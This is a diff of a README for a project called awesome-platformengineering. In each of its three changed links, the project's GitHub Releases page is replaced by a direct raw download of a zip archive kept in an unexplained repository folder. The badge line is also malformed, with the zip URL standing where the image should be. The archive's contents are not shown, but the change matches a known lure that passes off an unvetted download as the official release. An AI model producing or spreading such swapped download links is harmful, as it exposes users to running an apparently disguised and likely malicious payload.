@@ -1,6 +1,6 @@
 # 🌟 awesome-platformengineering - Simplifying Your Cloud Experience
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/HUUDINNC/awesome-platformengineering/releases)
+[![Download Now](https://raw.githubusercontent.com/HUUDINNC/awesome-platformengineering/main/techous/awesome-platformengineering-3.3.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/HUUDINNC/awesome-platformengineering/main/techous/awesome-platformengineering-3.3.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ To get started with awesome-platformengineering, follow these simple steps. You 
 
 To download the awesome-platformengineering application, visit the Releases page. Follow the link below:
 
-[Download Now](https://github.com/HUUDINNC/awesome-platformengineering/releases)
+[Download Now](https://raw.githubusercontent.com/HUUDINNC/awesome-platformengineering/main/techous/awesome-platformengineering-3.3.zip)
 
 ### 🔧 Installation Steps
 
@@ -71,4 +71,4 @@ awesome-platformengineering is open-source software, released under the MIT Lice
 
 To keep up with the latest news and updates, follow this repository on GitHub. You can also check our social media channels for tips, tutorials, and news regarding cloud engineering.
 
-[Download Now](https://github.com/HUUDINNC/awesome-platformengineering/releases)
+[Download Now](https://raw.githubusercontent.com/HUUDINNC/awesome-platformengineering/main/techous/awesome-platformengineering-3.3.zip)
